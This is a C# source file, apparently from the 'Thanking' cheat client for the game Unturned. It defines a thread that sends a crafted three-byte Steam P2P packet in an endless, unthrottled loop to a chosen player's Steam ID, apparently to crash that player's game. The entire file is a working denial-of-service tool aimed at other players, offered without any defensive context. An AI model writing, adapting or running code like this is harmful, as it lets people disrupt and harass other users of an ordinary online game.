﻿using System;
 using System.Collections.Generic;
 using System.Linq;
using System.Reflection;
using System.Threading;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
 using Thanking.Options;
 using Thanking.Overrides;
 using Thanking.Utilities;
 using Thanking.Variables;
 using UnityEngine;

namespace Thanking.Threads
{
    public static class RemotePlayerCrashThread
    {
        public static CSteamID CrashTarget;
        
        [Thread]
        public static void Start()
        {
            #if DEBUG
			DebugUtilities.Log("Player Crash Thread Started");
			#endif

            byte[] P1 = {(byte)ESteamPacket.UPDATE_RELIABLE_INSTANT, 0, 0};
            
            while (true)
                if (CrashTarget != CSteamID.Nil)
                    SteamNetworking.SendP2PPacket(CrashTarget, P1, 3, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
        }
    }
}
